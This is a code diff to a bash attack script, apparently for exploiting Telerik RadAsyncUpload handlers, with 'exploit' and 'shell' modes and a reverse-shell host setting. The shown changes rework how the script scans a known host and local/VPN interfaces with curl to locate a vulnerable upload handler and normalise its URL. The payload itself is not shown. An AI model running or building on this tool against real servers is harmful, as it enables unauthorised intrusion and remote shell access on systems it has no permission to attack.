@@ -45,6 +45,7 @@ case "$ARG" in
   *) die "usage: $0 [auto|check|versions|exploit|shell|all|http(s)://HOST:PORT]" ;;
 esac
 
+BASE_URL=""
 FOLDER="${FOLDER:-C:\Windows\Temp}"
 ARCH="${ARCH:-both}"
 REV_HOST="${REV_HOST:-}"
@@ -111,8 +112,13 @@ add_candidate() { # $1 base like http://1.2.3.4:82
 }
 
 build_candidates() {
-  # 1) explicit user pin
-  [ -n "${TARGET_URL:-}" ] && add_candidate "$TARGET_URL"
+  # 1) explicit user pin (a full URL with ?type=rau, or just a base)
+  if [ -n "${TARGET_URL:-}" ]; then
+    case "$TARGET_URL" in
+      *?type=rau*) add_candidate "$TARGET_URL" ;;
+      *) add_candidate "$(rau_url "$TARGET_URL")" ;;
+    esac
+  fi
   # 2) the known target
   add_candidate "http://${KNOWN_HOST}:${KNOWN_PORT}"
   # 3) local/VPN interfaces on common web ports
@@ -137,7 +143,9 @@ probe_target() {
     body=$(curl -sk --max-time 12 "$rau" 2>/dev/null || true)
     case "$body" in
       *"RadAsyncUpload handler is registered"*)
-        TARGET_URL="$rau"; BASE_URL="$base"
+        TARGET_URL="$rau"
+        BASE_URL="$(rau_url "$base")"
+        BASE_URL="${BASE_URL%%\?*}"
         log "TARGET FOUND: $TARGET_URL"
         return 0 ;;
       ""|*[![:print:]]*) : ;;  # empty/whitespace -> keep probing
@@ -146,7 +154,8 @@ probe_target() {
   done
   warn "No candidate answered with the RAU handler."
   warn "Defaulting to the known target; the version/exploit steps will confirm or fail fast."
-  TARGET_URL="$(rau_url "http://${KNOWN_HOST}:${KNOWN_PORT}")"; BASE_URL="http://${KNOWN_HOST}:${KNOWN_PORT}"
+  TARGET_URL="$(rau_url "http://${KNOWN_HOST}:${KNOWN_PORT}")"
+  BASE_URL="http://${KNOWN_HOST}:${KNOWN_PORT}"
   return 0
 }
 PAGE_URL="${PAGE_URL:-$BASE_URL}"
